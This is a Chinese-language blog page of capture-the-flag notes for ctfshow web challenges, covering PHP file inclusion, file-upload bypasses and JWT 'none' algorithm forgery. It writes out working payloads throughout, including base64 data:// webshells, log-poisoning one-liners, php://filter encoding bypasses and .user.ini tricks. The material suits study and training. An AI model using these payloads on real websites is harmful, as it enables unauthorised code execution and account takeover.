@@ -1,0 +1,803 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.jpg">
+  <link rel="icon" href="/img/avatar.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Lysander-xu">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="web入门信息收集爆破命令执行文件包含web78data伪协议直接打 12payload：url&#x2F;?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOyA&#x2F;Pg&#x3D;&#x3D;post传a&#x3D;system(&#x27;cat flag.php&#x27;);  web79同web78 web80php和data的替换用的是str_rep">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow">
+<meta property="og:url" content="http://example.com/2025/07/29/ctfshow/index.html">
+<meta property="og:site_name" content="blogs of Lysander-xu">
+<meta property="og:description" content="web入门信息收集爆破命令执行文件包含web78data伪协议直接打 12payload：url&#x2F;?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOyA&#x2F;Pg&#x3D;&#x3D;post传a&#x3D;system(&#x27;cat flag.php&#x27;);  web79同web78 web80php和data的替换用的是str_rep">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/ctfshow/web345_1.png">
+<meta property="og:image" content="http://example.com/images/ctfshow/web345_2.png">
+<meta property="article:published_time" content="2025-07-29T11:42:31.000Z">
+<meta property="article:modified_time" content="2025-10-08T16:00:45.911Z">
+<meta property="article:author" content="Lysander-xu">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/ctfshow/web345_1.png">
+  
+  
+  
+  <title>ctfshow - blogs of Lysander-xu</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":2},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"r9vmK9fMUcr65tyIT646Ea7h-MdYXbMMI","app_key":"xd0pvfqXwvUGMywmXYH6JDqn","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>blogs of Lysander-xu</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ctfshow"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-07-29 19:42" pubdate>
+          2025年7月29日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          18 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ctfshow</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="web入门"><a href="#web入门" class="headerlink" title="web入门"></a>web入门</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p>data伪协议直接打</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">payload：url/?<span class="hljs-keyword">file</span>=data:<span class="hljs-comment">//text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOyA/Pg==</span><br>post传a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p>同web78</p>
+<h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><p>php和data的替换用的是str_replace()，该函数区分大小写，可以用大小写绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">payload：url/?file=Php:<span class="hljs-comment">//input</span><br>post传<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cp fl0g.php 1.txt&#x27;</span>); <span class="hljs-meta">?&gt;</span>，再访问<span class="hljs-number">1</span>.txt即可<br></code></pre></td></tr></table></figure>
+
+<p>也可以用日志包含</p>
+<p>bp抓包将ua头改为<code>&lt;?php eval($_POST[&#39;a&#39;]); ?&gt;</code>，然后连马或直接命令执行</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">url/?<span class="hljs-keyword">file</span>=/var/<span class="hljs-built_in">log</span>/nginx/access.<span class="hljs-built_in">log</span><br>post传a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac fl0g.php&#x27;</span>);phpinfo();<br></code></pre></td></tr></table></figure>
+
+<h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><p>同web80用日志包含</p>
+<h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-16 21:57:55</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$file</span>), <span class="hljs-string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="hljs-variable">$content</span>);<br><br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure>
+
+<p>在写文件时，对$file进行了urldecode，可以利用url二编码绕过前面的str_replace</p>
+<p>php:&#x2F;&#x2F;filter绕过死亡die（<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php:&#x2F;&#x2F;filter的妙用</a>）</p>
+<p>核心原理：利用php:&#x2F;&#x2F;filter的过滤器将死亡die去除</p>
+<p>1、利用convert.base64-decode</p>
+<p>base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&lt;?php die(&#x27;大佬别秀了&#x27;)<span class="hljs-comment">;?&gt;最终写入文件的内容为phpdie作为base64编码</span><br>根据base<span class="hljs-number">64</span>的编码原理，<span class="hljs-number">3</span>个ascii字符将被编码为<span class="hljs-number">4</span>个base<span class="hljs-number">64</span>字符，所以应该在传入的content前加两个字符（不能是等号，等号是用来凑位数的，出现在base<span class="hljs-number">64</span>字符串结尾）使phpdieaa能够正常解码而不影响content的解码<br><br>payload：url/?file<span class="hljs-operator">=</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%2568</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%253</span>a<span class="hljs-variable">%252</span>f<span class="hljs-variable">%252</span>f<span class="hljs-variable">%2566</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%252</span>f<span class="hljs-variable">%2577</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%253</span>d<span class="hljs-variable">%2563</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%256</span>e<span class="hljs-variable">%2576</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%252</span>e<span class="hljs-variable">%2562</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2573</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2536</span><span class="hljs-variable">%2534</span><span class="hljs-variable">%252</span>d<span class="hljs-variable">%2564</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2563</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%2564</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%252</span>f<span class="hljs-variable">%2572</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2573</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%2575</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%2563</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%253</span>d<span class="hljs-variable">%2573</span><span class="hljs-variable">%2568</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%252</span>e<span class="hljs-variable">%2570</span><span class="hljs-variable">%2568</span><span class="hljs-variable">%2570</span><br>post传content<span class="hljs-operator">=</span>aaPD<span class="hljs-number">9</span>waHAgZXZhbCgkX<span class="hljs-number">1</span>BPU<span class="hljs-number">1</span>RbJ<span class="hljs-number">2</span>EnXSk<span class="hljs-number">7</span>ID<span class="hljs-number">8</span>+<br><br>然后连马或利用写的shell.php进行rce<br></code></pre></td></tr></table></figure>
+
+<p>2、利用string.rot13</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mel">url/?<span class="hljs-keyword">file</span>=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30<br>post传content=&lt;?cuc riny($_CBFG[<span class="hljs-string">&#x27;o&#x27;</span>]); ?&gt;<br><br>然后连马或利用写的shell.php进行rce<br></code></pre></td></tr></table></figure>
+
+<h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-17 02:27:25</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure>
+
+<p>过滤了php关键字及一些字符</p>
+<p>利用data:&#x2F;&#x2F;伪协议，由于过滤了关键字php和&#x3D;等字符，不能直接利用，要进行base64编码，但是要避免出现&#x3D;和+，可以在要编码的字符串中加空格避免&#x3D;和+出现</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">payload: url/?<span class="hljs-keyword">file</span>=data:<span class="hljs-comment">//text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7ICAgPz4g</span><br>post传a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac fl0g.php&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h3><p>提示前端校验不可靠，上传图片马，bp抓包将文件后缀改为php，给了文件的保存路径，直接进行rce或通过连马拿flag</p>
+<h3 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h3><p>提示后端校验要严密</p>
+<p>上传shell.php失败，上传shell.aaa失败</p>
+<p>发现抓不到shell.php和shell.aaa的包，应该也有前端校验，上传shell.png并抓包</p>
+<p>尝试将后缀改为php，上传成功，猜测后端应该是MIME类型检测，看一下源码，不出所料</p>
+<h3 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h3><p>MIME类型检测+黑名单检测（是每一关都有前端校验吗？只能抓到shell.png的包）</p>
+<p>抓到shell.png的包，到重放器中改包尝试上传其他文件</p>
+<p>上传user.ini，文件内容<code>auto_prepend_file=shell.png</code>，上传成功，再上传shell.png</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">payload:url/upload/index.php<br>post传a=<span class="hljs-built_in">system</span>(<span class="hljs-string">&#x27;cat ../flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<h3 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h3><p>MIME类型检测+黑名单检测+文件内容检测</p>
+<p>文件内容检测过滤了php，用短标签绕过<code>&lt;?= eval($_POST[&#39;a&#39;]); ?&gt;</code></p>
+<p>接下来同web153</p>
+<h3 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h3><p>同web154</p>
+<p>和web154的区别是upload.php中用于查找php的函数不同</p>
+<ul>
+<li>web154：strrpos()从字符串末尾开始查找子串首次出现的位置并返回索引，区分大小写</li>
+<li>web155：stripos()从字符串开头开始查找子串首次出现的位置并返回索引，不区分大小写</li>
+</ul>
+<h3 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h3><p>过滤了php和[</p>
+<p>上传user.ini，文件内容<code>auto_prepend_file=shell.png</code>，上传成功后，上传shell.png直接进行命令执行</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-meta">&lt;?</span>= <span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat ../f*&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>或用{}替换[]，<code>&lt;?= eval($_POST&#123;&#39;a&#39;&#125;); ?&gt;</code></p>
+<h3 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h3><p>过滤了php和“[{;”</p>
+<p>上传user.ini，文件内容<code>auto_prepend_file=shell.png</code>，上传成功后，上传shell.png直接进行命令执行</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-meta">&lt;?</span>= <span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac ../f*&#x27;</span>) <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h3><p>过滤了php和”[{;”</p>
+<p>同web157</p>
+<p>在查看该题源码的时候发现还过滤了log，应该是防止包含日志文件，可以通过拼接的方式进行绕过，shell.png内容</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;<span class="hljs-string">?=</span><span class="hljs-keyword">include</span><span class="hljs-string">&quot;/var/lo&quot;</span>.<span class="hljs-string">&quot;g/nginx/access.lo&quot;</span>.<span class="hljs-string">&quot;g&quot;</span><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后抓包在ua头插入一句话木马</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">payload:url/upload/index.php<br>post传a=<span class="hljs-built_in">system</span>(<span class="hljs-string">&#x27;cat ../flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<h3 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h3><p>过滤了php、log和’[{;(‘</p>
+<p>上传user.ini，文件内容<code>auto_prepend_file=shell.png</code>，上传成功后，上传shell.png</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;<span class="hljs-string">?=</span> <span class="hljs-string">`nl ../f*`</span> <span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h3><p>过滤了php、log、空格、反引号和”[{(;”</p>
+<p>通过拼接的方式去包含日志文件</p>
+<p>同web158</p>
+<h3 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h3><p>过滤了php、log、空格、反引号和”[{(;”</p>
+<p>直接上传合法的shell.png失败，应该是加了一个文件幻数头检测</p>
+<p>在shell.png和.user.ini文件首部加一个<code>GIF89a</code>，上传成功，接下来同web158</p>
+<h3 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h3><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h2 id="phpCVE"><a href="#phpCVE" class="headerlink" title="phpCVE"></a>phpCVE</h2><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h2 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h2><h2 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h2><h3 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h3><p>查看源码提示<code>&lt;!-- /admin --&gt;</code></p>
+<p>访问并抓包，发现没有签名的jwt</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">JWT支持将算法设置为<span class="hljs-string">&quot;None&quot;</span>，如果<span class="hljs-string">&quot;alg&quot;</span>字段设为<span class="hljs-string">&quot;None&quot;</span>，那么签名就会被置空，这样任何<span class="hljs-keyword">token</span>都是有效的，若不关闭该功能则可以通过伪造<span class="hljs-keyword">token</span>冒充任意用户登录<br></code></pre></td></tr></table></figure>
+
+<p>base64分别解码后，将payload中sub的值改为admin</p>
+<p>然后在<a target="_blank" rel="noopener" href="https://www.json.cn/jwt">在线jwt加&#x2F;解密</a>选定一个新的签名算法，生成新的token</p>
+<p><img src="/../images/ctfshow/web345_1.png" srcset="/img/loading.gif" lazyload></p>
+<p>将原token替换后，重放</p>
+<p><img src="/../images/ctfshow/web345_2.png" srcset="/img/loading.gif" lazyload></p>
